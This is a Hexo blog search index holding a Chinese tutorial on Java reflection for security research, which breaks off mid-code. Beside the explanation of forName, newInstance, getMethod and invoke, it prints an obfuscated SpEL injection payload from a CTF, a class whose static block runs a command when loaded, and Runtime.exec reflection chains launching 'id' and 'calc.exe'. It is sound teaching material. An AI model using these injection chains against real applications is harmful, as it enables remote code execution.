<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>Java安全-反射</title>
    <link href="/2025/08/14/Java%E5%AE%89%E5%85%A8-%E5%8F%8D%E5%B0%84/"/>
    <url>/2025/08/14/Java%E5%AE%89%E5%85%A8-%E5%8F%8D%E5%B0%84/</url>
    
    <content type="html"><![CDATA[<h1 id="Java安全-反射"><a href="#Java安全-反射" class="headerlink" title="Java安全-反射"></a>Java安全-反射</h1><h2 id="初步认识"><a href="#初步认识" class="headerlink" title="初步认识"></a>初步认识</h2><p>反射是大多数语言里都必不可少的组成部分，对象可以通过反射获取他的类，类可以通过反射拿到所有方法（包括私有），拿到的方法可以调用，总之通过“反射”，我们可以将Java这种静态语言附加上动态特性</p><p>一段代码，改变其中的变量，将会导致这段代码产生功能性的变化，可以称之为动态特性</p><p>PHP本身拥有很多动态特性，所以可以通过“一句话木马”来执行各种功能；Java虽不像PHP那么灵活， 但其提供的“反射”功能，也是可以提供一些动态特性。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">execute</span><span class="hljs-params">(String className, String methodName)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br> <span class="hljs-type">Class</span> <span class="hljs-variable">clazz</span> <span class="hljs-operator">=</span> Class.forName(className);<br> clazz.getMethod(methodName).invoke(clazz.newInstance());<br> &#125;<br></code></pre></td></tr></table></figure><ul><li>获取类的方法： forName </li><li>实例化类对象的方法： newInstance </li><li>获取函数的方法： getMethod getConstructor</li><li>执行函数的方法： invoke</li></ul><h2 id="对反射的理解"><a href="#对反射的理解" class="headerlink" title="对反射的理解"></a>对反射的理解</h2><h3 id="正射与反射"><a href="#正射与反射" class="headerlink" title="正射与反射"></a>正射与反射</h3><p>正射</p><p>我们在编写代码时，当需要使用到某一个类的时候，都会先了解这个类是做什么的。然后实例化这个类，接着用实例化好的对象进行操作，这就是正射。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Student</span> <span class="hljs-variable">student</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Student</span>();<br>student.doHomework(<span class="hljs-string">&quot;数学&quot;</span>);<br></code></pre></td></tr></table></figure><p>反射</p><p>反射就是，一开始并不知道我们要初始化的类对象是什么，自然也无法使用 new 关键字来创建对象了。我们以这一段经典的反射代码为例说明。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;  <br>    <span class="hljs-type">Person</span> <span class="hljs-variable">person</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Person</span>();  <br> <span class="hljs-type">Class</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> person.getClass();<br>&#125;<br></code></pre></td></tr></table></figure><blockquote><p>我们注意到在代码块中出现了大写 C 开头的 Class；</p></blockquote><p><strong>理解反射的第一步就必须先搞清楚 <code>Class</code> 是什么。</strong></p><h3 id="Java-Class-对象理解"><a href="#Java-Class-对象理解" class="headerlink" title="Java Class 对象理解"></a>Java Class 对象理解</h3><p>我们程序在运行的时候会编译生成一个 <code>.class</code> 文件，而这个 <code>.class</code> 文件中的内容就是相对应的类的所有信息，比如这段程序当中：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;  <br>    <span class="hljs-type">Person</span> <span class="hljs-variable">person</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Person</span>();  <br> <span class="hljs-type">Class</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> person.getClass();<br>&#125;<br></code></pre></td></tr></table></figure><p>其实 <code>person.class</code> 就是 <code>Class</code>，Class 也就是描述类的类。</p><p><strong>Class 类的对象作用</strong>是运行时提供或获得某个对象的类型信息。</p><blockquote><p>所以反射其实就是操作 <code>Class</code>，看清楚了，是大 C</p></blockquote><h2 id="反射的使用方法"><a href="#反射的使用方法" class="headerlink" title="反射的使用方法"></a>反射的使用方法</h2><h3 id="1-实例化对象"><a href="#1-实例化对象" class="headerlink" title="1.实例化对象"></a>1.实例化对象</h3><p>实例化对象的核心原因是：<strong>要在内存里产生一个具体的实体，才能存储和操作该类的属性、调用它的非静态方法</strong>。</p><p>非静态方法需要对象才能调用</p><ul><li>静态方法（<code>static</code>）跟类绑定，不需要对象就能用。</li><li>非静态方法依赖实例数据，所以必须先有一个对象（实例）才能执行</li></ul><p>对于普通用户我们可以采用以下方法创建实例：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Person</span> <span class="hljs-variable">test</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Person</span>();<br></code></pre></td></tr></table></figure><p>而我们在创建 Class 类的实例对象却不能使用上述方法，运行会抛出错误</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Class</span> <span class="hljs-variable">test</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>();<br></code></pre></td></tr></table></figure><p>因为 Class 类是 <code>private</code> 私有属性，我们也无法通过创建对象的方式来获取 class 对象，那么我们怎样才能够获取到 class 对象呢？一般我们获取 class 对象就有以下三种方法，我们来逐一看看。</p><h4 id="方法一、实例化对象的getClass-方法"><a href="#方法一、实例化对象的getClass-方法" class="headerlink" title="方法一、实例化对象的getClass()方法"></a>方法一、实例化对象的getClass()方法</h4><p>如果上下⽂中存在某个类的实例 <code>obj</code>，那么我们可以通过 <code>obj.getClass</code> 来获取它的类。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">TestReflection</span> <span class="hljs-variable">testReflection</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TestReflection</span>();<br><span class="hljs-type">Class</span> <span class="hljs-variable">class3</span> <span class="hljs-operator">=</span> testReflection.getClass();<br></code></pre></td></tr></table></figure><h4 id="方法二、-使用类的-class-方法"><a href="#方法二、-使用类的-class-方法" class="headerlink" title="方法二、 使用类的 .class 方法"></a>方法二、 使用类的 .class 方法</h4><p>如果你已经加载了某个类，只是想获取到它的 <code>java.lang.Class</code> 对象，那么就直接拿它的 <code>class</code> 属性即可。这个⽅法其实不属于反射。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Class</span> <span class="hljs-variable">class2</span> <span class="hljs-operator">=</span> TestReflection.class;<br></code></pre></td></tr></table></figure><h4 id="方法三、Class-forName-String-className-："><a href="#方法三、Class-forName-String-className-：" class="headerlink" title="方法三、Class.forName(String className)："></a>方法三、Class.forName(String className)：</h4><p>如果你知道某个类的名字，想获取到这个类，就可以使⽤ <code>forName</code> 来获取，后续要利用的话是需要实例化的。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Class</span> <span class="hljs-variable">class1</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;reflection.TestReflection&quot;</span>);<br></code></pre></td></tr></table></figure><h3 id="2-获取成员变量-Field"><a href="#2-获取成员变量-Field" class="headerlink" title="2. 获取成员变量 Field"></a>2. 获取成员变量 Field</h3><p>获取成员变量Field位于 <code>java.lang.reflect.Field</code> 包中</p><p>Field[] getFields() ：获取所有 public 修饰的成员变量</p><p>Field[] getDeclaredFields() 获取所有的成员变量，不考虑修饰符</p><p>Field getField(String name) 获取指定名称的 public 修饰的成员变量</p><p>Field getDeclaredField(String name) 获取指定的成员变量</p><h3 id="3-获取成员方法-Method-都不包含构造函数"><a href="#3-获取成员方法-Method-都不包含构造函数" class="headerlink" title="3. 获取成员方法 Method(都不包含构造函数)"></a>3. 获取成员方法 Method(都不包含构造函数)</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java">Method <span class="hljs-title function_">getMethod</span><span class="hljs-params">(String name, 类&lt;?&gt;... parameterTypes)</span> <span class="hljs-comment">//返回该类所声明的public方法</span><br><br>Method <span class="hljs-title function_">getDeclaredMethod</span><span class="hljs-params">(String name, 类&lt;?&gt;... parameterTypes)</span> <span class="hljs-comment">//返回该类所声明的所有方法</span><br><br><span class="hljs-comment">//第一个参数获取该方法的名字，第二个参数获取标识该方法的参数类型</span><br><br>Method[] getMethods() <span class="hljs-comment">//获取所有的public方法，包括类自身声明的public方法，父类中的public方法、实现的接口方法</span><br><br>Method[] getDeclaredMethods() <span class="hljs-comment">// 获取该类中的所有声明方法，包括私有的，不包括父类继承的</span><br></code></pre></td></tr></table></figure><p>在 <strong>Person.java</strong> 中添加如下代码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">study</span><span class="hljs-params">(String s)</span> &#123;  <br>    System.out.println(<span class="hljs-string">&quot;学习中...&quot;</span> + s);  <br>&#125;  <br><span class="hljs-keyword">private</span> String <span class="hljs-title function_">sleep</span><span class="hljs-params">(<span class="hljs-type">int</span> age)</span> &#123;  <br>    System.out.println(<span class="hljs-string">&quot;睡眠中...&quot;</span> + age);  <br> <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;sleep&quot;</span>;  <br>&#125;<br></code></pre></td></tr></table></figure><p>并在 <strong>ReflectionTest02.java</strong> 中添加如下</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> src;  <br>  <br><span class="hljs-keyword">import</span> com.sun.xml.internal.ws.encoding.MtomCodec;  <br>  <br><span class="hljs-keyword">import</span> java.lang.reflect.Method;  <br>  <br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ReflectionTest02</span> &#123;  <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;  <br>        <span class="hljs-type">Class</span> <span class="hljs-variable">c1</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;src.Person&quot;</span>);<span class="hljs-comment">// 创建 Class 对象  </span><br> Method[] methods1 = c1.getDeclaredMethods();<span class="hljs-comment">// 获取所有该类中的所有方法  </span><br> Method[] methods2 = c1.getMethods();<span class="hljs-comment">// 获取所有的 public 方法，包括类自身声明的 public 方法，父类中的  、实现的接口方法  </span><br>  <br> <span class="hljs-keyword">for</span> (Method m:methods1)&#123;  <br>            System.out.println(m);  <br> &#125;  <br>        System.out.println(<span class="hljs-string">&quot;-------分割线---------&quot;</span>);  <br>  <br> <span class="hljs-keyword">for</span> (Method m:methods2) &#123;  <br>            System.out.println(m);  <br> &#125;  <br>  <br>        System.out.println(<span class="hljs-string">&quot;-------分割线---------&quot;</span>);  <br>  <br> <span class="hljs-type">Method</span> <span class="hljs-variable">methods3</span> <span class="hljs-operator">=</span> c1.getMethod(<span class="hljs-string">&quot;study&quot;</span>, String.class);<span class="hljs-comment">// 获取 Public 的 study 方法  </span><br> System.out.println(methods3);  <br> System.out.println(<span class="hljs-string">&quot;-------分割线---------&quot;</span>);  <br>  <br> <span class="hljs-type">Method</span> <span class="hljs-variable">methods4</span> <span class="hljs-operator">=</span> c1.getDeclaredMethod(<span class="hljs-string">&quot;sleep&quot;</span>, <span class="hljs-type">int</span>.class); <span class="hljs-comment">// 获取 Private 的 sleep 方法  </span><br> System.out.println(methods4);  <br> &#125;  <br>  <br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/img/java%E5%AE%89%E5%85%A8/a02.png"></p><h3 id="4-获取构造函数"><a href="#4-获取构造函数" class="headerlink" title="4. 获取构造函数"></a>4. 获取构造函数</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java">Constructor&lt;?&gt;[] getConstructors() ：只返回<span class="hljs-keyword">public</span>构造函数<br><br>Constructor&lt;?&gt;[] getDeclaredConstructors() ：返回所有生命的构造函数<br><br>Constructor&lt;&gt; getConstructor(类&lt;?&gt;... parameterTypes) : 匹配和参数配型相符的<span class="hljs-keyword">public</span>构造函数<br><br>Constructor&lt;&gt; getDeclaredConstructor(类&lt;?&gt;... parameterTypes) ： 匹配和参数配型相符的构造函数<br></code></pre></td></tr></table></figure><h2 id="反射涉及的方法"><a href="#反射涉及的方法" class="headerlink" title="反射涉及的方法"></a>反射涉及的方法</h2><h3 id="forName方法"><a href="#forName方法" class="headerlink" title="forName方法"></a>forName方法</h3><p>forName 不不是获取“类”的唯一途径，通常来说我们有如下三种方式获取一个“类”，也就 是java.lang.Class对象：</p><ul><li>obj.getClass() 如果上下文中存在某个类的实例obj ，那么我们可以直接通过obj.getClass() 来获取它的类 </li><li>Test.class 如果你已经加载了某个类，只是想获取到它的 java.lang.Class 对象，那么就直接拿它的 class 属性即可。这个方法其实不属于反射。</li><li>Class.forName 如果你知道某个类的名字，想获取到这个类，就可以使用 forName 来获取</li></ul><p>在安全研究中，我们使用反射的一大目的，就是绕过某些沙盒。比如，上下文中如果只有Integer类型的数字，我们如何获取到可以执行命令的Runtime类呢？也许可以这样（伪代码）：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-number">1.</span>getClass().forName(<span class="hljs-string">&quot;java.lang.Runtime&quot;</span>)<br></code></pre></td></tr></table></figure><p>关于绕沙盒，之前Code-Breaking 2018p神出了一道SpEL的题目(学习SpEL注入时还用来做实例记录了)</p><p><a href="http://rui0.cn/archives/1015">Code-Breaking Puzzles — javacon WriteUp – Ruilin</a></p><p>当时的payload(弹出计算器)</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">#&#123;<span class="hljs-string">&#x27;&#x27;</span>.getClass().forName(<span class="hljs-string">&#x27;java.la&#x27;</span>+<span class="hljs-string">&#x27;ng.Ru&#x27;</span>+<span class="hljs-string">&#x27;ntime&#x27;</span>).getMethod(<span class="hljs-string">&#x27;ex&#x27;</span>+<span class="hljs-string">&#x27;ec&#x27;</span>,<span class="hljs-string">&#x27;&#x27;</span>.getClass()).invoke(<span class="hljs-string">&#x27;&#x27;</span>.getClass().forName(<span class="hljs-string">&#x27;java.la&#x27;</span>+<span class="hljs-string">&#x27;ng.Ru&#x27;</span>+<span class="hljs-string">&#x27;ntime&#x27;</span>).getMethod(<span class="hljs-string">&#x27;getRu&#x27;</span>+<span class="hljs-string">&#x27;ntime&#x27;</span>).invoke(<span class="hljs-literal">null</span>),<span class="hljs-string">&#x27;calc&#x27;</span>)&#125;<br></code></pre></td></tr></table></figure><h4 id="forName有两个函数重载："><a href="#forName有两个函数重载：" class="headerlink" title="forName有两个函数重载："></a>forName有两个函数重载：</h4><ul><li>Class forName(String name) </li><li>Class forName(String name, <strong>boolean</strong> initialize, ClassLoader loader)</li></ul><p> 第一个就是我们最常见的获取class的方式，其实可以理解为第二种方式的一个封装</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java">Class.forName(className)<br> <span class="hljs-comment">// 等于</span><br>Class.forName(className, <span class="hljs-literal">true</span>, currentLoader)<br></code></pre></td></tr></table></figure><p>默认情况下， forName 的第一个参数是类名；第二个参数表示是否初始化；第三个参数就 是ClassLoader</p><h5 id="第三个参数ClassLoader"><a href="#第三个参数ClassLoader" class="headerlink" title="第三个参数ClassLoader"></a>第三个参数ClassLoader</h5><p>ClassLoader 就是一个“加载器”，告诉Java虚拟机如何加载这个类。Java默认的ClassLoader是根据类名加载类，这个类名是类完整路径，如 java.lang.Runtime 。</p><h5 id="第二个参数initialize："><a href="#第二个参数initialize：" class="headerlink" title="第二个参数initialize："></a>第二个参数initialize：</h5><p>在 forName 的时候，构造函数并不会执行，即使我们设置initialize&#x3D;true。</p><p>那么这个初始化究竟指什么呢？</p><p>可以将这个“初始化”理解为类的初始化。我们先来看看如下这个类：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">TrainPrint</span> &#123;<br>    &#123;<br>        System.out.printf(<span class="hljs-string">&quot;Empty block initial %s\n&quot;</span>, <span class="hljs-built_in">this</span>.getClass());<br>    &#125;<br>    <span class="hljs-keyword">static</span> &#123;<br>        System.out.printf(<span class="hljs-string">&quot;Static initial %s\n&quot;</span>, TrainPrint.class);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">TrainPrint</span><span class="hljs-params">()</span> &#123;<br>        System.out.printf(<span class="hljs-string">&quot;Initial %s\n&quot;</span>, <span class="hljs-built_in">this</span>.getClass());<br>    &#125;<br> &#125;<br></code></pre></td></tr></table></figure><p>三个“初始化”方法有什么区别，调用顺序是什么，在安全上有什么价值?</p><p>首先调用的是static {}，其次是{}，最后是构造函数。</p><p>其中，static {}就是在“类初始化”的时候调用的，而{}中的代码会放在构造函数的super()[调用父类的构造方法]后面， 但在当前构造函数内容的前面。所以说，forName中的initialize&#x3D;true其实就是告诉Java虚拟机是否执行”类初始化“。</p><p>那么，假设我们有如下函数，其中函数的参数name可控</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">ref</span><span class="hljs-params">(String name)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>    Class.forName(name);<br> &#125;<br>---<br>静态方法调用，直接用类名调用。<br>作用：根据类的全限定名（包名 + 类名），加载并初始化类（会执行静态代码块）。<br>name 必须是类的全限定名，例如 <span class="hljs-string">&quot;com.example.MyClass&quot;</span>。<br>Class.forName() 属于 java.lang.Class，是一个静态方法，不需要对象实例。<br></code></pre></td></tr></table></figure><p>我们就可以编写一个恶意类，将恶意代码放置在static {}中，从而执行：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.lang.Runtime;<br> <span class="hljs-keyword">import</span> java.lang.Process;<br> <span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">TouchFile</span> &#123;<br>    <span class="hljs-keyword">static</span> &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-type">Runtime</span> <span class="hljs-variable">rt</span> <span class="hljs-operator">=</span> Runtime.getRuntime();<br>            String[] commands = &#123;<span class="hljs-string">&quot;touch&quot;</span>, <span class="hljs-string">&quot;/tmp/success&quot;</span>&#125;;<br>            <span class="hljs-type">Process</span> <span class="hljs-variable">pc</span> <span class="hljs-operator">=</span> rt.exec(commands);<br>            pc.waitFor();<br>        &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>            <span class="hljs-comment">// do nothing</span><br>        &#125;<br>    &#125;<br> &#125;<br></code></pre></td></tr></table></figure><p>在正常情况下，除了系统类，如果我们想拿到一个类，需要先 import 才能使用。而使用forName就不需要，这样对于我们的攻击者来说就十分有利，我们可以加载任意类。</p><h3 id="newInstance方法-无参构造函数-单例模式静态方法"><a href="#newInstance方法-无参构造函数-单例模式静态方法" class="headerlink" title="newInstance方法(无参构造函数,单例模式静态方法)"></a>newInstance方法(无参构造函数,单例模式静态方法)</h3><p>我们经常在一些源码里看到，类名的部分包含$符号，比如fastjson在checkAutoType 时候就会先将$替换成 . :</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">String</span> <span class="hljs-variable">className</span> <span class="hljs-operator">=</span> typeName.replace(<span class="hljs-string">&#x27;$&#x27;</span>, <span class="hljs-string">&#x27;.&#x27;</span>);<br></code></pre></td></tr></table></figure><p>$ 的作用是查找内部类。</p><p>Java的普通类 C1 中支持编写内部类C2，而在编译的时候，会生成两个文件： C1.class 和 C1$C2.class ，我们可以把他们看作两个无关的类，通过 Class.forName(“C1$C2”) 即可加载这个内部类。</p><p>获得类以后，我们可以继续使用反射来获取这个类中的属性,方法，也可以实例化这个类，并调用方法。</p><p>class.newInstance() 的作用就是调用这个类的无参构造函数，这个比较好理解。不过，我们有时候在写漏洞利用方法的时候，会发现使用 newInstance 总是不成功，这时候原因可能是</p><ol><li>你使用的类没有无参构造函数 </li><li>你使用的类构造函数是私有的</li></ol><p>最最最常见的情况就是 java.lang.Runtime ，这个类在我们构造命令执行Payload的时候很常见，但 我们不能直接这样来执行命令：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Class</span> <span class="hljs-variable">clazz</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;java.lang.Runtime&quot;</span>);<br> clazz.getMethod(<span class="hljs-string">&quot;exec&quot;</span>, String.class).invoke(clazz.newInstance(), <span class="hljs-string">&quot;id&quot;</span>);<br></code></pre></td></tr></table></figure><p>会报错</p><p>原因是 Runtime 类的构造方法是私有的</p><h4 id="单例模式"><a href="#单例模式" class="headerlink" title="单例模式"></a>单例模式</h4><p>类的构造方法是私有的</p><p>比如，对于Web应用来说，数据库连接只需要建立一次，而不是每次用到数据库的时候再新建立一个连接，此时作为开发者你就可以将数据库连接使用的类的构造函数设置为私有，然后编写一个静态方法来获取</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs java"> <span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">TrainDB</span> &#123;<br> <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-type">TrainDB</span> <span class="hljs-variable">instance</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TrainDB</span>();<br> <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> TrainDB <span class="hljs-title function_">getInstance</span><span class="hljs-params">()</span> &#123;<br> <span class="hljs-keyword">return</span> instance;<br> &#125;<br>    <span class="hljs-keyword">private</span> <span class="hljs-title function_">TrainDB</span><span class="hljs-params">()</span> &#123;<br> <span class="hljs-comment">// 建立连接的代码...</span><br> &#125;<br>&#125;<br><br><br><span class="hljs-comment">//private static TrainDB instance = new TrainDB(); </span><br><span class="hljs-comment">// ↑ 这里在类加载时自动调用私有构造方法</span><br><span class="hljs-comment">//调用构造方法</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Main</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-comment">// 正确获取实例的方式</span><br>        <span class="hljs-type">TrainDB</span> <span class="hljs-variable">db1</span> <span class="hljs-operator">=</span> TrainDB.getInstance();<br>        <span class="hljs-type">TrainDB</span> <span class="hljs-variable">db2</span> <span class="hljs-operator">=</span> TrainDB.getInstance();<br>        <br>        <span class="hljs-comment">// 验证确实是同一个实例</span><br>        System.out.println(db1 == db2); <span class="hljs-comment">// 输出 true</span><br>        <br>        <span class="hljs-comment">// 错误尝试（无法编译）：</span><br>        <span class="hljs-comment">// TrainDB db3 = new TrainDB();</span><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>这样，只有类初始化的时候会执行一次构造函数，后面只能通过 getInstance 获取这个对象，避免建立多个数据库连接。</p><p>Runtime类就是单例模式，我们只能通过 Runtime.getRuntime() 来获取到 Runtime 对象。我们将上述Payload进行修改即可正常执行命令了：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Class</span> <span class="hljs-variable">clazz</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;java.lang.Runtime&quot;</span>);<br> clazz.getMethod(<span class="hljs-string">&quot;exec&quot;</span>, <br>String.class).invoke(clazz.getMethod(<span class="hljs-string">&quot;getRuntime&quot;</span>).invoke(clazz), <br><span class="hljs-string">&quot;calc.exe&quot;</span>);<br></code></pre></td></tr></table></figure><h3 id="getMethod方法-公有方法"><a href="#getMethod方法-公有方法" class="headerlink" title="getMethod方法(公有方法)"></a>getMethod方法(公有方法)</h3><p>getMethod 的作用是通过反射获取一个类的某个特定的公有方法。Java中 支持类的重载，我们不能仅通过函数名来确定一个函数。所以，在调用getMethod的时候，我们需要传给他你需要获取的函数的参数类型列表。</p><p>比如这里的 Runtime.exec 方法有6个重载：</p><p><img src="/img/java%E5%AE%89%E5%85%A8/a01.png"></p><p>我们使用第一个，它只有一个参数，类型是String，所以我们使用 getMethod(“exec”, String.class) 来获取 Runtime.exec 方法。</p><h3 id="invoke方法"><a href="#invoke方法" class="headerlink" title="invoke方法"></a>invoke方法</h3><p>invoke 的作用是执行方法，它的第一个参数是： </p><ul><li>如果这个方法是一个普通方法，那么第一个参数是类对象 </li><li>如果这个方法是一个静态方法，那么第一个参数是类</li></ul><p>这也比较好理解了，我们正常执行方法是 [1].method([2], [3], [4]…)，其实在反射里就是 method.invoke([1], [2], [3], [4]…)。 所以我们将上述命令执行的Payload分解一下就是：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Class</span> <span class="hljs-variable">clazz</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;java.lang.Runtime&quot;</span>);<br><span class="hljs-type">Method</span> <span class="hljs-variable">execMethod</span> <span class="hljs-operator">=</span> clazz.getMethod(<span class="hljs-string">&quot;exec&quot;</span>, String.class);<br><span class="hljs-type">Method</span> <span 